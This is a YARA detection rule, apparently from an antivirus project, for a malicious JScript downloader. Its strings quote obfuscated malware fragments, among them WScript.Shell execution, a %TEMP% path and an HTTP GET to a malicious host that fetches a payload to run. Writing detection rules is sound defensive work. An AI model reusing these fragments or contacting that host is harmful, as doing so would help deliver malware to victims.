rule sig_20160427_83035c3becfeb4c964b18f0abef589a3 {
  meta:
    description = "datamaliciousorder - file 20160427_83035c3becfeb4c964b18f0abef589a3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "af3ce8150cfb9427996d2b86867fc8e941c48ae889af5a25015038fbd84a389b"

  strings:
    $s1  = "function MmvtgJyted() {return KfcdpKxrqo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"hk5su8Z" ascii
    $s2  = "function MmvtgJyted() {return KfcdpKxrqo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"hk5su8Z" ascii
    $s3  = "function RxlajOxnex(LzwhtEnlsh, KjukzPledn){ShphsWeewu = ShphsWeewu * 1; return LzwhtEnlsh - KjukzPledn;};" fullword ascii
    $s4  = "KamojDjiby[MhhdeWeqwh](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s5  = "var FsbqvAmsax = this[\"WScript\"];" fullword ascii
    $s6  = "function UoumoTghte(){return KceijFgcxq + \"\";};" fullword ascii
    $s7  = "var KfcdpKxrqo = function PefahYtrnn() {return FsbqvAmsax[PkapeWlhyu](\"WScript\"+\".Shell\");}(), AbucaWfiql = 11;" fullword ascii
    $s8  = "if (KamojDjiby[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function MrchqVrcdi() {return ((LdzhlCxdrk == true) && (LdzhlCxdrk == KfiixNuzaw)) ? 1 : ShphsWeewu;};" fullword ascii
    $s10 = "function HbuzcNsifr(QlmgdQmaqk){KfcdpKxrqo[\"R\"+\"un\"](QlmgdQmaqk, ShphsWeewu, ShphsWeewu);};" fullword ascii
    $s11 = "var LdzhlCxdrk = false;" fullword ascii
    $s12 = "function FilaeSwmin(){return 23;};" fullword ascii
    $s13 = "function TvkhpLwxdz()" fullword ascii
    $s14 = "var DorxrQopql = false;" fullword ascii
    $s15 = "function GtupcCjdgz(){return PkapeWlhyu;};" fullword ascii
    $s16 = "var KfiixNuzaw = false;" fullword ascii
    $s17 = "LdzhlCxdrk = true; " fullword ascii
    $s18 = "var BpzzyXszpq = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function DzaprGlnve(TvxdcXqbij) {var FmkzfHvaqy = (1, 2, 3, 4, 5, TvxdcXqbij); return FmkzfHvaqy;};" fullword ascii
    $s20 = "}while (ZcjqrVdvgp);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}